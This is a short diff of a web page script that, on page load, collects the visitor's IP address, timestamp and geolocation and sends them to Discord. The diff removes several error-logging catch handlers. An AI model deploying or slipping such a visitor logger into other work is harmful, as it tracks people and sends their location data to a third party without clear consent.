@@ -12,12 +12,10 @@ document.addEventListener('DOMContentLoaded', () => {
           const message = createMessage(ipAddress, dateTimeString, geoData);
           sendToDiscord(message);
         })
-        .catch(error => console.error(error));
 
       document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
       document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
     })
-    .catch(error => console.error(error));
 });
 
 function createMessage(ipAddress, dateTimeString, geoData) {
@@ -65,5 +63,4 @@ function sendToDiscord(message) {
         throw new Error('Error sending message to Discord');
       }
     })
-    .catch(error => console.error(error));
 }
